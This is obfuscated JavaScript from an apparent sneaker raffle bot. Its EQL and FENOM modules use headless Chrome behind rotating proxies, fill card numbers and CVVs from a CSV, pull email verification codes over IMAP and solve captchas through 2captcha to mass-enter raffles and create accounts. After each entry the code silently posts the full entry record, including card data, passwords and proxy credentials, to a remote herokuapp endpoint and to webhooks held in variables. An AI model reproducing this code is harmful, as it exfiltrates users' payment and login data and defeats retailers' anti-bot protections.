                            await _0x4b01dc(0x3e8), await _0x46d9c9['type']('#address1', _0x4a3791[_0xe8fef4]['Address1'] + '\x20' + _0x4a3791[_0xe8fef4]['HouseNumber']), await _0x4b01dc(0x1f4), await _0x46d9c9['type']('#address2', '' + _0x4a3791[_0xe8fef4]['Address2']), await _0x4b01dc(0x1f4), await _0x46d9c9['type']('#city', '' + _0x4a3791[_0xe8fef4]['City']), await _0x4b01dc(0x1f4), await _0x46d9c9['type']('#postcode', '' + _0x4a3791[_0xe8fef4]['Zip']), await _0x4b01dc(0x3e8), await _0x46d9c9['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x4b01dc(0x3e8), console['log'](_0x303e65() + '\x20[' + _0x3806c7['name'] + ']\x20Task\x20' + (_0xe8fef4 + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0x2502dd = await _0x46d9c9['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x2502dd && (await _0x46d9c9['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x46d9c9['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x46d9c9['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4b01dc(0x4b0), await _0x46d9c9['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4b01dc(0x1f4), await _0x46d9c9['keyboard']['type']('' + _0x4a3791[_0xe8fef4]['CardNumber']), await _0x4b01dc(0x320), await _0x46d9c9['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x46d9c9['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x46d9c9['keyboard']['type']('' + _0x4a3791[_0xe8fef4]['ExpiryDate']), await _0x4b01dc(0x4b0), await _0x46d9c9['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x46d9c9['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x46d9c9['keyboard']['type']('' + _0x4a3791[_0xe8fef4]['CVV']), await _0x4b01dc(0x226), await _0x46d9c9['type']('input[name=\x22postalCode\x22]', '' + _0x4a3791[_0xe8fef4]['Zip']), await _0x4b01dc(0x226));
                            const _0x5444f8 = await _0x46d9c9['$']('.__PrivateStripeElement');
                            _0x5444f8 && (await _0x4b01dc(0x1f4), await _0x46d9c9['click']('.__PrivateStripeElement'), await _0x46d9c9['click']('.__PrivateStripeElement'), await _0x46d9c9['keyboard']['type']('' + _0x4a3791[_0xe8fef4]['CardNumber']), await _0x46d9c9['keyboard']['type']('' + _0x4a3791[_0xe8fef4]['ExpiryDate']), await _0x46d9c9['keyboard']['type']('' + _0x4a3791[_0xe8fef4]['CVV']));
                            await _0x4b01dc(0x226), await _0x46d9c9['click']('#paymentConsent'), await _0x4b01dc(0x226), await _0x46d9c9['click']('#termsConsent'), await _0x4b01dc(0x2bc), console['log'](_0x303e65() + '\x20[' + _0x3806c7['name'] + ']\x20Task\x20' + (_0xe8fef4 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x46d9c9['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x4b01dc(0x2710);
                            try {
                                await _0x46d9c9['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x4b01dc(0xbb8), await _0x46d9c9['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x54fb5b => _0x54fb5b['click']()), await _0x46d9c9['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x99a5e2 => _0x99a5e2['click']());
                            } catch {
                            }
                            try {
                                await _0x46d9c9['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x3f5031 = await _0x46d9c9['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x3f5031) {
                                    _0x3f6207['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x4a3791[_0xe8fef4]['Email'] + ',' + _0x4a3791[_0xe8fef4]['Password'] + ',' + _0x4a3791[_0xe8fef4]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x5ba87b() {
                                var _0x376f4c, _0x5c0272 = ![];
                                for (var _0x1d4992 = 0x0; _0x1d4992 < 0x18; _0x1d4992++) {
                                    async function _0x1a96b0() {
                                        var _0x86a3a9 = new _0xc8c5aa({
                                            'user': _0x33c579['masterMail'],
                                            'password': _0x33c579['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x170808(_0x2941c2) {
                                            _0x86a3a9['openBox']('INBOX', ![], _0x2941c2);
                                        }
                                        _0x86a3a9['once']('ready', function () {
                                            console['log'](_0x303e65() + '\x20[' + _0x3806c7['name'] + ']\x20Task\x20' + (_0xe8fef4 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x170808(function (_0x39b73e, _0x5a91a0) {
                                                console['log'](_0x303e65() + '\x20[' + _0x3806c7['name'] + ']\x20Task\x20' + (_0xe8fef4 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x39b73e)
                                                    throw _0x39b73e;
                                                _0x86a3a9['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x442ccc, _0x3bdba4) {
                                                    if (!_0x3bdba4 || !_0x3bdba4['length'])
                                                        console['log'](_0x303e65() + '\x20[' + _0x3806c7['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x86a3a9['end']();
                                                    else {
                                                        var _0x4bd7b7 = _0x86a3a9['seq']['fetch'](_0x3bdba4, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x4bd7b7['on']('message', function (_0x3a4023, _0xb66600) {
                                                            var _0x18ddf7 = '(#' + _0xb66600 + ')\x20';
                                                            _0x3a4023['on']('body', function (_0x3a5555, _0x50bc70) {
                                                                _0x1d4048(_0x3a5555, (_0x202cd0, _0x15d9bc) => {
                                                                    if (_0x15d9bc['subject']['includes']('code')) {
                                                                        const _0x53f2d5 = _0x15d9bc['text']['split']('\x0a\x0a')[0x3], _0x122a7c = _0x53f2d5['split']('\x0a')[0x1];
                                                                        _0x376f4c = _0x122a7c;
                                                                    }
                                                                });
                                                            }), _0x3a4023['once']('end', function () {
                                                            });
                                                        }), _0x4bd7b7['once']('error', function (_0x1fed8b) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x4bd7b7['once']('end', function () {
                                                            _0x86a3a9['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x86a3a9['once']('error', function (_0x158a0b) {
                                            console['log'](_0xd12810['red'](_0x158a0b['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x5c0272 = !![];
                                        }), _0x86a3a9['once']('end', async function () {
                                        }), _0x86a3a9['connect']();
                                    }
                                    _0x1a96b0(), await _0x4b01dc(0x1388);
                                    if (_0x376f4c)
                                        return _0x376f4c;
                                    if (_0x5c0272)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x1d4992 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x5ba87b(), await _0x4b01dc(0x1f4), await _0x46d9c9['type']('#code', '' + code), await _0x4b01dc(0x3e8), await _0x46d9c9['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x513899 => _0x513899['click']()), await _0x46d9c9['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x303e65() + '\x20[' + _0x3806c7['name'] + ']\x20Task\x20' + (_0xe8fef4 + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x46d9c9['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0xd12810['green'](_0x303e65() + '\x20[' + _0x3806c7['name'] + ']\x20Task\x20' + (_0xe8fef4 + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x4a3791[_0xe8fef4]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x3f6207['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x4a3791[_0xe8fef4]['Email'] + ',' + _0x4a3791[_0xe8fef4]['Password'] + ',' + _0x4a3791[_0xe8fef4]['Phone']), _0x4aa750 = 'no', _0x41d22(_0x4a3791[_0xe8fef4], _0x3806c7);
                            var _0x2435a7 = await _0x4a5b92(_0x4a3791[_0xe8fef4], _0x3806c7, 'dev', ![]), _0x41aeb5 = await _0x4a5b92(_0x4a3791[_0xe8fef4], _0x3806c7, 'pub', ![]);
                            let _0x3fea67 = _0x4a3791[_0xe8fef4];
                            try {
                                prxdata = {
                                    'username': _0x4ebc10['replace']('#', ''),
                                    'module': _0x3806c7['name'],
                                    'entrydata': JSON['stringify'](_0x3fea67),
                                    'proxy': '' + _0x239a47[_0xe8fef4]
                                };
                                var _0xa64110 = JSON['stringify'](prxdata);
                                let _0x45332d = { 'headers': { 'content-type': 'application/json' } };
                                await _0x4f7750['post']('https://jraffles.herokuapp.com/success', _0xa64110, _0x45332d);
                            } catch (_0x4a9884) {
                            }
                            const _0x48d793 = {
                                'succesDEVMSG': { 'embeds': [_0x2435a7] },
                                'succesPUBMSG': { 'embeds': [_0x41aeb5] }
                            };
                            try {
                                _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x48d793['succesDEVMSG']), await _0x4b01dc(0xc8), await _0x265172(_0x485a18, _0x48d793['succesDEVMSG']), await _0x4b01dc(0xc8), await _0x265172(_0x2c2f0f, _0x48d793['succesPUBMSG']);
                            } catch (_0x6d2c48) {
                                console['log'](_0xd12810['yellow'](_0x303e65() + '\x20[' + _0x3806c7['name'] + ']\x20Task\x20' + (_0xe8fef4 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x6d2c48));
                            }
                        } catch (_0x1cb7f7) {
                            console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x3806c7['name'] + ']\x20Task\x20' + (_0xe8fef4 + 0x1) + '\x20:\x20' + _0x1cb7f7)), _0x232bcb = '' + _0x1cb7f7;
                            var _0x5a979c = await _0x4a5b92(_0x4a3791[_0xe8fef4], _0x3806c7, 'dev', !![], _0x232bcb), _0x2435a7 = await _0x4a5b92(_0x4a3791[_0xe8fef4], _0x3806c7, 'dev', ![]), _0x41aeb5 = await _0x4a5b92(_0x4a3791[_0xe8fef4], _0x3806c7, 'pub', ![]);
                            const _0x28ce9f = {
                                'succesDEVMSG': { 'embeds': [_0x2435a7] },
                                'succesPUBMSG': { 'embeds': [_0x41aeb5] }
                            };
                            _0x28ce9f['errorDEV'] = { 'embeds': [_0x5a979c] };
                            _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x28ce9f['errorDEV']);
                            await _0x265172(_0x3cc994, _0x28ce9f['errorDEV']);
                            if (!_0x4aa750 == 'no')
                                _0x4aa750 = 'yes';
                        } finally {
                            _0x26dabf && _0x26dabf['close']();
                            if (_0x4aa750 == 'yes' && _0x42e828 != 0x5) {
                                console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x3806c7['name'] + ']\x20Task\x20' + (_0xe8fef4 + 0x1) + '\x20:\x20Retrying\x20(' + _0x42e828 + '\x20/\x205)')), _0xe8fef4 = _0xe8fef4 - 0x1, _0x42e828 = _0x42e828 + 0x1;
                                continue;
                            }
                            _0x4aa750 == 'yes' && _0x42e828 >= 0x5 && (_0x2b505c(_0x4a3791[_0xe8fef4], _0x3806c7), _0x4aa750 = 'no', _0x42e828 = 0x0), console['log']('Waiting\x20for\x20' + _0x33c579['delay'] + '\x20ms'), await _0x4b01dc(_0x33c579['delay']);
                        }
                    } else {
                        const _0x16728a = '' + _0x4a3791[_0xe8fef4]['Url'];
                        if (_0x4aa750 != 'yes')
                            var _0x4aa750 = '', _0x42e828 = 0x0;
                        if (_0x4a3791[_0xe8fef4]['Email'] == '' || _0x4a3791[_0xe8fef4]['FirstName'] == '' || _0x4a3791[_0xe8fef4]['LastName'] == '') {
                            console['log'](_0x303e65() + '\x20[' + _0x3806c7['name'] + ']\x20Task\x20' + (_0xe8fef4 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x4a3791[_0xe8fef4]['Password'] == '' && (_0x4a3791[_0xe8fef4]['Password'] = 'JRaffles23!');
                        if (_0x33c579['useRandomProxy'] = ![])
                            var _0x5df845 = _0x239a47[_0xe8fef4]['split'](':');
                        else
                            var _0xbe1c77 = Math['round'](Math['random']() * (_0x239a47['length'] - 0x1)), _0x5df845 = _0x239a47[_0xbe1c77]['split'](':');
                        var _0x26dabf;
                        try {
                            _0x26dabf = await _0x284c7b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5df845[0x0] + ':' + _0x5df845[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x26dabf = await _0x284c7b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5df845[0x0] + ':' + _0x5df845[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x35c945 = await _0x26dabf['newPage']();
                            await _0x35c945['authenticate']({
                                'username': '' + _0x5df845[0x2],
                                'password': '' + _0x5df845[0x3]
                            }), console['log'](_0x303e65() + '\x20[' + _0x3806c7['name'] + ']\x20Task\x20' + (_0xe8fef4 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x35c945['setRequestInterception'](!![]), _0x35c945['on']('request', _0x359793 => {
                                _0x359793['resourceType']() === 'image' || _0x359793['resourceType']() === 'font' || _0x359793['resourceType']() === 'media' ? _0x359793['abort']() : _0x359793['continue']();
                            }), await _0x35c945['goto'](_0x16728a), await _0x35c945['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button');
                            let _0x5bdf54 = await _0x35c945['$']('#gatsby-focus-wrapper\x20>\x20div:nth-child(3)\x20>\x20div\x20>\x20div\x20>\x20span\x20>\x20div\x20>\x20button.MuiButton-root.MuiButton-contained.MuiButton-containedSecondary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButtonBase-root.css-78bdfl');
                            if (_0x5bdf54)
                                await _0x5bdf54['click']();
                            await _0x4b01dc(0x7d0), await _0x35c945['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x4b01dc(0x7d0), await _0x35c945['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x35c945['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x4b01dc(0x3e8), await _0x35c945['waitForSelector']('#email'), console['log'](_0x303e65() + '\x20[' + _0x3806c7['name'] + ']\x20Task\x20' + (_0xe8fef4 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x35c945['type']('#email', '' + _0x4a3791[_0xe8fef4]['Email']), await _0x4b01dc(0x352), await _0x35c945['waitForSelector']('#password'), await _0x35c945['type']('#password', '' + _0x4a3791[_0xe8fef4]['Password']), await _0x4b01dc(0x352), await _0x35c945['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x4b01dc(0x1388);
                            if (!_0x4a3791[_0xe8fef4]['Url']['includes']('footlocker') && !_0x4a3791[_0xe8fef4]['Url']['includes']('topps'))
                                await _0x35c945['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            let _0x6182a = await _0x35c945['$']('#productQuantity'), _0x3fbc18 = await _0x35c945['$']('div[data-testid=\x22field-productVariantID');
                            if (!_0x3fbc18 && !_0x6182a) {
                                console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x3806c7['name'] + ']\x20Task\x20' + (_0xe8fef4 + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x4aa750 = 'no';
                                continue;
                            }
                            if (_0x3fbc18) {
                                await _0x35c945['click']('div[data-testid=\x22field-productVariantID\x22]');
                                try {
                                    _0x4a3791[_0xe8fef4]['Url']['includes']('en-GB') ? await _0x35c945['click']('li[data-value=\x22UK\x20' + _0x4a3791[_0xe8fef4]['Size'] + '\x20/\x20US\x20' + (Number(_0x4a3791[_0xe8fef4]['Size']) + 0x1) + '\x22]') : await _0x35c945['click']('li[data-value=\x22EU\x20' + _0x4a3791[_0xe8fef4]['Size'] + '\x22]');
                                } catch {
                                    throw new Error('Error\x20fetching\x20size\x20' + _0x4a3791[_0xe8fef4]['Size']);
                                }
                            }
                            _0x6182a && (await _0x35c945['click']('#productQuantity'), await _0x4b01dc(0x3e8), await _0x35c945['click']('li[data-value=\x22' + (Number(_0x4a3791[_0xe8fef4]['Size']) - 0x1) + '\x22]'));
                            await _0x4b01dc(0x3e8), await _0x4b01dc(0x1f4);
                            const _0x30925c = await _0x35c945['$']('#title\x20>\x20label');
                            await _0x4b01dc(0x12c);
                            _0x30925c && await _0x30925c['click']();
                            await _0x35c945['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x35c945['focus']('#postcode'), await _0x35c945['keyboard']['down']('Control'), await _0x35c945['keyboard']['press']('A'), await _0x35c945['keyboard']['up']('Control'), await _0x35c945['keyboard']['press']('Backspace'), await _0x35c945['keyboard']['type'](_0x4a3791[_0xe8fef4]['Zip']), await _0x4b01dc(0x60e), await _0x35c945['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x4b01dc(0x3e8), console['log'](_0x303e65() + '\x20[' + _0x3806c7['name'] + ']\x20Task\x20' + (_0xe8fef4 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x4b01dc(0x1f4);
                            const _0x550db8 = await _0x35c945['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x550db8 && (await _0x35c945['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x35c945['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x35c945['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4b01dc(0x4b0), await _0x35c945['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4b01dc(0x1f4), await _0x35c945['keyboard']['type']('' + _0x4a3791[_0xe8fef4]['CardNumber']), await _0x4b01dc(0x320), await _0x35c945['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x35c945['keyboard']['type']('' + _0x4a3791[_0xe8fef4]['ExpiryDate']), await _0x4b01dc(0x4b0), await _0x35c945['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x35c945['keyboard']['type']('' + _0x4a3791[_0xe8fef4]['CVV']), await _0x4b01dc(0x226), await _0x35c945['type']('input[name=\x22postalCode\x22]', '' + _0x4a3791[_0xe8fef4]['Zip']), await _0x4b01dc(0x226));
                            const _0x5d1d08 = await _0x35c945['$']('.__PrivateStripeElement');
                            _0x5d1d08 && (await _0x35c945['click']('#billingName'), await _0x35c945['click']('#billingName'), await _0x35c945['type']('#billingName', '' + _0x4a3791[_0xe8fef4]['NameOnCard']), await _0x4b01dc(0x1f4), await _0x35c945['click']('.__PrivateStripeElement'), await _0x35c945['click']('.__PrivateStripeElement'), await _0x35c945['keyboard']['type']('' + _0x4a3791[_0xe8fef4]['CardNumber']), await _0x35c945['keyboard']['type']('' + _0x4a3791[_0xe8fef4]['ExpiryDate']), await _0x35c945['keyboard']['type']('' + _0x4a3791[_0xe8fef4]['CVV']));
                            await _0x4b01dc(0x226), await _0x35c945['click']('#paymentConsent'), await _0x4b01dc(0x226), await _0x35c945['click']('#termsConsent'), await _0x4b01dc(0x2bc), console['log'](_0x303e65() + '\x20[' + _0x3806c7['name'] + ']\x20Task\x20' + (_0xe8fef4 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x35c945['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x4b01dc(0x2710);
                            try {
                                await _0x35c945['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x4b01dc(0xbb8), await _0x35c945['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x216455 => _0x216455['click']()), await _0x35c945['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x2d7553 => _0x2d7553['click']());
                            } catch {
                            }
                            try {
                                await _0x35c945['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0xd12810['green'](_0x303e65() + '\x20[' + _0x3806c7['name'] + ']\x20Task\x20' + (_0xe8fef4 + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x41d22(_0x4a3791[_0xe8fef4], _0x3806c7);
                            var _0x2435a7 = await _0x4a5b92(_0x4a3791[_0xe8fef4], _0x3806c7, 'dev', ![]), _0x41aeb5 = await _0x4a5b92(_0x4a3791[_0xe8fef4], _0x3806c7, 'pub', ![]);
                            let _0xcf212a = _0x4a3791[_0xe8fef4];
                            try {
                                prxdata = {
                                    'username': _0x4ebc10['replace']('#', ''),
                                    'module': _0x3806c7['name'],
                                    'entrydata': JSON['stringify'](_0xcf212a),
                                    'proxy': '' + _0x239a47[_0xe8fef4]
                                };
                                var _0xa64110 = JSON['stringify'](prxdata);
                                let _0x129c68 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x4f7750['post']('https://jraffles.herokuapp.com/success', _0xa64110, _0x129c68);
                            } catch (_0x1fb3bd) {
                            }
                            const _0x3b6bab = {
                                'succesDEVMSG': { 'embeds': [_0x2435a7] },
                                'succesPUBMSG': { 'embeds': [_0x41aeb5] }
                            };
                            try {
                                _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x3b6bab['succesDEVMSG']), await _0x4b01dc(0xc8), await _0x265172(_0x485a18, _0x3b6bab['succesDEVMSG']), await _0x4b01dc(0xc8), await _0x265172(_0x2c2f0f, _0x3b6bab['succesPUBMSG']);
                            } catch (_0x5decc0) {
                                console['log'](_0xd12810['yellow'](_0x303e65() + '\x20[' + _0x3806c7['name'] + ']\x20Task\x20' + (_0xe8fef4 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x5decc0));
                            }
                            _0x4aa750 = 'no';
                        } catch (_0x419aa8) {
                            console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x3806c7['name'] + ']\x20Task\x20' + (_0xe8fef4 + 0x1) + '\x20:\x20' + _0x419aa8)), _0x232bcb = '' + _0x419aa8;
                            var _0x5a979c = await _0x4a5b92(_0x4a3791[_0xe8fef4], _0x3806c7, 'dev', !![], _0x232bcb), _0x2435a7 = await _0x4a5b92(_0x4a3791[_0xe8fef4], _0x3806c7, 'dev', ![]), _0x41aeb5 = await _0x4a5b92(_0x4a3791[_0xe8fef4], _0x3806c7, 'pub', ![]);
                            const _0x4dddfc = {
                                'succesDEVMSG': { 'embeds': [_0x2435a7] },
                                'succesPUBMSG': { 'embeds': [_0x41aeb5] }
                            };
                            _0x4dddfc['errorDEV'] = { 'embeds': [_0x5a979c] }, _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x4dddfc['errorDEV']), await _0x265172(_0x3cc994, _0x4dddfc['errorDEV']), _0x4aa750 = 'yes';
                        } finally {
                            _0x26dabf && _0x26dabf['close']();
                            if (_0x4aa750 == 'yes' && _0x42e828 != 0x5) {
                                console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x3806c7['name'] + ']\x20Task\x20' + (_0xe8fef4 + 0x1) + '\x20:\x20Retrying\x20(' + _0x42e828 + '\x20/\x205)')), _0xe8fef4 = _0xe8fef4 - 0x1, _0x42e828 = _0x42e828 + 0x1;
                                continue;
                            }
                            _0x4aa750 == 'yes' && _0x42e828 >= 0x5 && (_0x2b505c(_0x4a3791[_0xe8fef4], _0x3806c7), _0x4aa750 = 'no', _0x42e828 = 0x0), console['log']('Waiting\x20for\x20' + _0x33c579['delay'] + '\x20ms'), await _0x4b01dc(_0x33c579['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x5bd067, _0x460162, _0xcd0d37) {
                    var _0x245733 = _0x460162, _0x1057a6 = 0x0;
                    for (var _0x351a51 = 0x0; _0x351a51 < _0x460162['length']; _0x351a51++) {
                        maxTasks = Number(_0x33c579['threads']);
                        while (_0x1057a6 >= maxTasks) {
                            await _0x4b01dc(_0x33c579['delay']);
                        }
                        let _0x4e87fa = ![];
                        async function _0x274922(_0x502aba, _0x52e8f5, _0x468177, _0x2dd89e, _0x31ae2d) {
                            _0x1057a6++, _0x284c7b['use'](_0xecf9cb()), _0x284c7b['use'](_0x88e53d({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x33c579['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x103a8e != 'yes')
                                var _0x103a8e = '', _0x31ae2d = 0x0;
                            var _0x350e9c;
                            try {
                                await _0x32ecbd(_0x52e8f5, _0x2dd89e);
                            } catch {
                                _0x103a8e = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x369d34(_0x502aba['name'] + '\x20Task\x20' + (_0x2dd89e + 0x1) + '\x20/\x20' + _0x52e8f5['length'] + '\x20||\x20File:\x20' + _0x506019 + '\x20Proxies:\x20' + _0x15bf3f);
                            var _0x3792b5 = await _0x4a5b92(_0x52e8f5[_0x2dd89e], _0x502aba, 'acc', ![]);
                            const _0x24bed0 = { 'succesDEVMSG': { 'embeds': [_0x3792b5] } }, _0x700a9e = 'https://www.fenom.com/en/authentication?create_account=1';
                            var _0x4370c0 = Math['round'](Math['random']() * (_0x468177['length'] - 0x1)), _0x4bba5b = _0x468177[_0x4370c0]['split'](':'), _0x20c04f;
                            async function _0x1d2358(_0x1b2588) {
                                const _0x4ba5fa = _0x3f6207['readFileSync']('../accounts/fenom.csv', 'utf8'), _0x534da3 = _0x3a0f5b['parse'](_0x4ba5fa, { 'header': !![] })['data'];
                                let _0xd9c3cd = ![];
                                for (var _0x55594f of _0x534da3) {
                                    if (_0x55594f['Email'] == _0x1b2588['Email']) {
                                        _0xd9c3cd = !![];
                                        break;
                                    }
                                }
                                return _0xd9c3cd;
                            }
                            try {
                                if (await _0x1d2358(_0x52e8f5[_0x2dd89e]) == !![]) {
                                    console['log'](_0x303e65() + '\x20[' + _0x502aba['name'] + ']\x20Task\x20' + (_0x2dd89e + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x4e87fa = !![], dupli = !![];
                                    return;
                                }
                                try {
                                    _0x20c04f = await _0x284c7b['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
